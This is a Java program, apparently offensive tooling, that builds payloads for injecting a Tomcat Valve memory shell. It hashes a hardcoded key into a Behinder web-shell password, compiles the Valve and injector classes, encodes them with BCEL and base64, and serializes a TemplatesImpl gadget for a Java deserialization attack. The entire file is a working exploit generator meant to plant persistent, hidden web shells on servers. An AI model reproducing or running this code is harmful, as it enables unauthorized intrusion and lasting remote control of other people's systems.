package com.service;

import com.Classes.addvalveStr;
import com.Classes.getrequest;
import com.Classes.valveImplStr;
import com.compiler.JavaStringCompiler;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.utils.BytesUtil;
import com.utils.GetTemplateImpl;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Map;

public class Main {
    public static void main(String[] args) {
        String key="qax36oNbs";
        JavaStringCompiler javaStringCompiler = new JavaStringCompiler();
        try {
            /*生成冰鞋连接密码*/
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte[] digest = md5.digest(key.getBytes(StandardCharsets.UTF_8));
            String s = BytesUtil.bytesToHexString(digest).substring(0,16);

            /*获取valve对象*/
            Map<String, byte[]> compile = javaStringCompiler.compile(valveImplStr.className+".java", String.format(valveImplStr.valveimpl, s));
            byte[] bytes = compile.get(valveImplStr.className);
            String encode = Utility.encode(bytes,false);
            System.out.println("获取的valve对象是："+encode);

            /*获取addValve对象，执行注入*/
            Map<String, byte[]> compile1 = javaStringCompiler.compile(addvalveStr.className + ".java", String.format(addvalveStr.addvalvestr, encode));
            byte[] bytes1 = compile1.get(addvalveStr.className);
            String encode1 = Utility.encode(bytes1, false);
            System.out.println("获取的addValve对象是："+encode1);
            System.out.println("获取的addValve对象是(base64)："+new sun.misc.BASE64Encoder().encode(bytes));


            /*获取getRequest对象，这个可以用来缩短payload，反序列化这一部分，然后将addValve变成参数传递可以减少shell长度*/
            Map<String, byte[]> compile2 = javaStringCompiler.compile(getrequest.className + ".java", getrequest.getrequest);
            byte[] bytes2 = compile2.get(getrequest.className);
            String encode2 = Utility.encode(bytes2, false);
            System.out.println("getRequest对象是："+encode2);

            /*获取Template对象，序列化之后：Utility，不压缩编码*/
            GetTemplateImpl getTemplate = new GetTemplateImpl();
            TemplatesImpl templates = getTemplate.GetTemplateImpl_(encode2);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(templates);
            String encode3 = Utility.encode(outputStream.toByteArray(),false);
            System.out.println("获取的Template对象(序列化之后的)是："+encode3);
        }catch (Exception e){
            e.printStackTrace();
        }

    }


}
